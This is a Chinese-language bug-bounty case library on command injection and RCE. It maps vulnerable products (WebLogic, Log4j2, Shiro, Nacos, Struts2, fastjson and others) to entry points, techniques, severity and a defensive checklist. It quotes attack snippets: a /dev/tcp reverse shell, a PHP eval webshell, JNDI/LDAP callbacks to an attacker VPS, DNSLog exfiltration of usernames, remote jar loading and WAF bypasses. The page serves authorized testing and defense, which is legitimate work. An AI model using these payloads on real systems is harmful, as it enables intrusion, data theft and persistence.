# 命令注入 / 服务端直接执行 案例库

> **回查原文** → `ima-retrieval-index.md` §三（ima `src报告/命令注入/` folder_id + 关键词 + 报告名直搜）。

> 来源：个人 ima 知识库 `src`（knowledge_base_id = `7492290188703512`），`src报告/命令注入/` 目录。
> 目录 folder_id：`folder_7492580979798876`（Web=`folder_7492580979780012`，EduSRC=`folder_7492580983973976`，App=`folder_7492580983973996`）。
> 采集日期：2026-09-14。原始条目 49（Web 46 + EduSRC 2 + App 1）→ 去重后唯一 38 份。
> 精读约 25 份；读取失败 1 份（Fastjson 长文 PDF 超 token 上限，存盘未读，已标注）。
> 红线检查：已读案例均为技术复现 / 授权渗透，未发现社工、钓鱼、水坑、免杀卸载 EDR、买卖账号或真实个人隐私数据，**无需标 `⚠️ 红线`**。
> SRC 准则：只验证无害回显（`id`/`whoami`），不落持久化、不碰业务数据。

---

## 一、组件指纹速查表

| 组件 / 系统 | 指纹 / 识别线索 | 关联 CVE / 版本 | 典型入口 |
|---|---|---|---|
| 浙江宇视 ISC | `title=="ISC5000-E"` | ISC 综合安防 | `GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=...` |
| 安美数字（酒店宽带运营） | FOFA `"酒店宽带运营"` | 未授权 ping | `/manager/radius/server_ping.php` |
| AJ-Report | 路径 `/dataSetParam/verification` | < 某修复版 | JS 引擎 `validationRules` |
| 致远 OA（Seeyon） | `/seeyon/ajax.do` | 文件上传类 | `fileToExcel`→`saveExcelInBase` |
| WebLogic | `/_async/`、`/wls-wsat/` | CVE-2017-3506/10271/2019-2725/2729、CVE-2023-21839 | XMLDecoder / IIOP |
| Nacos | 默认 8848，未鉴权 | 2.3.2 / 2.4.0 | 配置接口 RCE |
| K8s API Server | 8080（未鉴权）/ 6443 | RBAC 误配 | `kubectl -s` exec |
| ThinkPHP | 框架特征 | < 6.0.14 | 路由命令执行 |
| 若依（Ruoyi） | 默认 swagger 泄露 | 弱口令 + 定时任务 | YAML `snakeyaml` |
| PHPStudy / 小皮面板 | `phpstudy` / `小皮` 标识 | 后门 PHP / 计划任务 | `system()` / `save_shell` |
| DedeCMS | `/plus/flink.php` | V5.8.1 | Referer 控 `$gourl` |
| Joomla | 模板编辑器 | ≤ 4.2.2 | 模板写 `shell_exec` |
| Struts2 | Jakarta multipart | S2-045 / 046 | Content-Type OGNL |
| Log4j2 | 登录/搜索框 | CVE-2021-44228 | `${jndi:ldap://...}` |
| Shiro | `rememberMe` cookie | 硬编码 key | 反序列化 |
| rome 链 | 依赖 `rome` | 反序列化 | `ToStringBean` gadget |
| 浙江移动 / 美团 API | 登录框 / Groovy 入口 | Log4j2 / Groovy | JNDI / `groovyInput` |

---

## 二、打法分类

1. **命令拼接注入**：参数直接拼 shell。如安美数字 `ip=127.0.0.1|cat /etc/passwd>../../pq.txt`；VPN `img=x /tmp|echo \`whoami\``。
2. **代码执行（表达式/脚本引擎）**：AJ-Report 的 `validationRules` 内 `new java.lang.ProcessBuilder("whoami").start()`；美团 `groovyInput=int q=9` + `Process p="whoami".execute().text`；Neat Reader 导入书触发 `<img/onerror=eval(require("child_process").exec("calc.exe"))>`。
3. **反序列化 RCE**：Shiro（`CommonsBeanutils1 + TomcatEcho`，源码泄露得 key）、rome（`ToStringBean`→`HashMap`/`XString` equals 链）、MySQL JDBC（`jdbc:%6d%79%73%71%6c` urlencode 绕过 `autoDeserialize`）。
4. **OGNL / SSTI**：Struts2 S2-045/046 在 Content-Type 注入 OGNL；若依 snakeyaml 定时任务 `!!javax.script.ScriptEngineManager` 加载远程 `ftp://.../yaml-payload.jar`。
5. **未授权 RCE**：Nacos 2.3.2/2.4.0 配置接口；K8s 8080 未鉴权 `exec`；WebLogic `_async`/`wls-wsat` XMLDecoder。
6. **计划任务 / 脚本落马**：PHPStudy 后门 `system('echo <?php @eval($_POST[cmd]);?> > .../shell.php')`；小皮面板 `save_shell` 一键；K8s 特权 pod 写 crontab 反弹。
7. **数据库层 RCE**：山东理工 `/login.aspx` 的 `txtYHM` MSSQL 注入 → `xp_cmdshell` → powershell 反弹（EduSRC）。

---

## 三、不出网 / 无回显手法

- **写文件回显**：安美数字 `>../../pq.txt` 将结果写 web 目录再访问；致远 OA `saveExcelInBase` 写 `test2.jsp` 取回显。
- **DNSLog / OOB**：Log4j2 `${jndi:ldap://${sys:user.name}.xxx.dnslog.cn/test}` 借子域名外带；Fastjson 同理打 DNSLog。
- **SSRF 探绝对路径**：致远 OA 先 SSRF 读取配置文件拿 web 绝对路径，再 `saveExcelInBase` 写已知路径。
- **反弹 / 计划任务**：无回显时 `bash -i >& /dev/tcp/ip/port 0>&1`、crontab 反弹、K8s 写 SSH key。
- **本地文件落地验证**：`touch /tmp/success` 类无害写操作确认执行（SRC 推荐，不动业务）。

### 三·补、回显有了、命令跑不动 → 降级为读文件

> 来源：猎洞时刻《通杀 Edusrc通杀70rank漏洞实战高危思路和WAF绕过》（2026-09-14）。RCE 已打通、回显模块也已连通，但**`java` 进程权限不足以调起 `cmd.exe`**：

```
Cmd decode error: java.io.IOException: Cannot run program "cmd.exe": CreateProcess error=5
```

`error=5` = 拒绝访问（**权限问题，不是利用失败**）。此时不要弃坑，改走"只读"降级链：

1. **在 catch 块里取环境变量** —— 该报错是工具 `try/catch` 捕获后抛出的。**改工具源码，在 catch 里塞 `System.getenv()`** 并把结果带回显，先确认身份（本例拿到 `LOCAL SERVICE`）。这是"命令执行不可用"时第一个仍可用的回显通道。
   > 思路本质：**任何"执行类 API 失败"的异常分支，都值得塞一个信息回显**。异常处理代码往往没做安全考量。
2. **列目录 / 读文件（不经过 `cmd.exe`）** —— 同样改回显模块，把 `whoami` 换成 Java 原生文件读写。本例列出 tomcat `conf` 全部文件名，再读出 **`context.xml`**（数据源口令、`reloadable` 等）。
3. **证明危害即止** —— 读到配置文件即可定级，不必继续写文件。

**`LOCAL SERVICE` 能力清单（Windows 低权限服务账户）**：

| 能做 | 不能做 |
|---|---|
| 读 `C:\Windows\System32` 等系统目录 | **通常不能写**系统目录 |
| 读写自己的 `%LOCALAPPDATA%`：`C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp` | 写 Web 目录 |
| 监听本地端口 | 调起 `cmd.exe`（`CreateProcess error=5`） |
| **读取 Web 应用源码与配置**（tomcat `conf/context.xml`、`server.xml`） | 提权 / 加用户 |

> **判据**：**"命令执行失败" ≠ "没拿到东西"。** 同一条 RCE 里，Java 原生文件读写往往比 `Runtime.exec` 走得更远 —— 很多 SRC 只认"能读到敏感数据/配置"即为高危，不要求交互式 shell。

---

## 四、排查 Checklist（防守侧）

- [ ] 用户输入是否拼入 `exec`/`system`/`ProcessBuilder`/OS 命令 → 必须白名单 + 转义。
- [ ] 是否存在 Groovy / JS / SpEL / OGNL 表达式入口，且内容用户可控。
- [ ] 反序列化：是否用默认 key（Shiro）、是否放开 `autoDeserialize`（MySQL JDBC）、是否含 `rome`/`snakeyaml` 危险 gadget。
- [ ] 组件版本：Log4j2 < 2.15、WebLogic 旧补丁、Struts2、ThinkPHP < 6.0.14、Nacos 未鉴权、K8s 8080 暴露。
- [ ] 鉴权绕过特征：`;swagger-ui`、`JSESSIONID=chat`、未授权 `/_async`、API Server 8080。
- [ ] WAF 对抗面：脏数据注释、CDATA、分块传输、CP037 编码、multipart/related —— 不能只靠 WAF。
- [ ] 数据库账户是否启用 `xp_cmdshell` / 出网权限。

---

## 五、案例索引（已精读）

| 标题 | 平台 | 核心点 |
|---|---|---|
| 浙江宇视 ISC LogReport | Web | `fileString` 写文件，`title==ISC5000-E` 指纹 |
| 浙江移动 RCE | Web | 登录框 Log4j2 JNDI |
| 美团 API RCE | Web | Groovy `groovyInput` 代码执行 |
| 安美数字 server_ping | Web | `\|` 管道写文件回显，FOFA 指纹 |
| AJ-Report | Web | JS 引擎 + `;swagger-ui` 绕过鉴权 |
| ThinkPHP <6.0.14 | Web | 路由命令执行 0day |
| Bypass 某 VPN | Web | `sslvpn_client.php` 管道 + base64 写马 |
| Nacos 2.3.2/2.4.0 | Web | 配置接口 RCE，POC `ayoundzw/nacos-poc` |
| K8s API Server 8080/6443 | Web | 未鉴权 exec / RBAC 提权 |
| Neat Reader | App | 导入书 XSS + Node `child_process` |
| 容大天成 / PHPStudy 后门 | Web | `system` 直执行 + 写马 |
| 智慧养老（若依） | Web | 弱口令 + snakeyaml YAML 链 |
| DedeCMS V5.8.1 | Web | `flink.php` Referer 控 + 拆函数绕过禁用 |
| Joomla ≤4.2.2 | Web | 模板编辑器写 `shell_exec` |
| 致远 OA saveExcelInBase | Web | 任意文件写 JSP + SSRF 探路径 |
| WebLogic XMLDecoder | Web | 多 CVE + WAF 绕过手法 |
| Struts2 S2-045/046 | Web | Content-Type OGNL |
| 小皮面板 | Web | XSS + 计划任务 1click RCE |
| rome + MySQL 反序列化 | Web | gadget 链 + JDBC urlencode 绕过 |
| Shiro | Web | key 泄露 + CommonsBeanutils1 |
| WebLogic CVE-2023-21839 | Web | IIOP + ForeignOpaqueReference |
| Log4j2 | Web | JndiLookup 调用链 + 利用工具 |
| 微信账单 CSV 注入 | App | 用户名可控导出 CSV 触发公式 |
| 山东理工 RCE | EduSRC | MSSQL `xp_cmdshell` + 反弹（见 _work/edusrc-cmd-add.md） |

### 五·补、外部来源案例（非 ima `src` 库）

| 标题 | 来源 | 核心点 |
|---|---|---|
| 通杀 Edusrc 通杀 70 rank 漏洞实战 | 猎洞时刻，2026-09-14（公众号） | 全链：首页未授权 → 前端泄露 `.map` → 反解 JS 拿到 **CXF 服务接口地址** → 按接口文档构造 `corpBillInfo` POST（体 `JSON`、参名 `request`）→ 少一个花括号触发 `JSONException` 定 **fastjson 1.2.39 + autoType 开** → DNSLog 验出网 → **双重 `@type`**（把 `@type` 嵌进业务 DTO 的 `request.a` / `request.b` 字段）调 `JdbcRowSetImpl` → `ldap://<vps>:53/Basic/TomcatEcho` + 头 `cmd: whoami` 回显。三层 WAF 绕过见 `waf-bypass.md` §2.11；落地遇 `CreateProcess error=5` 的降级链见本文件 §三·补。工具 `JNDIExploit-1.3`（`-i -l 53 -p 80`）见 `jndi-injection-test.md` §4 |

---

## 六、未精读清单（标题级，file_size 不同未合并）

以下为通用方法论 / 非具体组件类，按规则未逐篇精读，留待按需补充：

- 如何挖到第一个 RCE（多副本，标题级保留）
- 如何挖到一个 RCE（多副本）
- php 代码审计之代码 / 命令执行
- CTFSHOW 命令执行专题
- 记一次 Oracle 提权
- Zerologon 利用
- 一种有趣的权限维持
- [艰难的某次众测]
- 记一次从登录框到前台 RCE
- 12-远程代码执行探讨

> 注：通用方法论不挤占具体组件利用链的优先级；若需并入技能包"思路"章节再单独精读。

---

## 七、厂商定级尺度（参考）

- **严重 / 高危**：可直接 RCE 且无需认证（Nacos 未授权、K8s 8080、WebLogic `_async`、致远 `saveExcelInBase`、AJ-Report）→ 多数 SRC 给高危~严重。
- **高危**：需登录但稳定 RCE（若依弱口令+链、DedeCMS、Joomla 模板、Struts2、ThinkPHP、Log4j2、Shiro、rome/MySQL 反序列化）。
- **中危**：需特定依赖或条件（Groovy 入口、Neat Reader 诱导导入、CSV 注入需受害者打开）。
- **教育侧**：山东理工为授权/教育环境 MSSQL `xp_cmdshell`，按 EduSRC 通常高危，且作者声明未脱库、未内网探测，符合合规边界。

---

## 八、素材缺口

1. **Fastjson 系列长文**（两万字 PDF）因超 token 上限未实读，仅存盘。**2026-09-15 部分补足**：外部案例（§五·补 通杀 70 rank）已补上完整 fastjson 实战链；`subkb-netsec-cases.md` §2 有"不看版本看依赖"探测四步。该 PDF 仍可留待分页读取补链细节。
2. 未精读清单中通用方法论未纳入，缺"从入口点到 RCE 的系统性排查思路"章节素材。
3. WAF 绕过手法缺可复现最小 POC（注释 / CDATA / CP037 / 分块 / multipart 各一份）。**2026-09-15 已补 2 个实战样本**：请求体洪泛、敏感词 base64→hex 双层编码（见 `waf-bypass.md` §2.11）。
4. App 侧仅 1 条（Neat Reader）+ 微信 CSV，移动端"服务端直接执行"样本偏少。
5. **执行权限受限场景样本仍少**：§三·补 记了 `LOCAL SERVICE` 一例，缺"命令不可执行但可读文件"的其他中间件/账户形态（如 IIS 应用池账户、容器内非 root）。
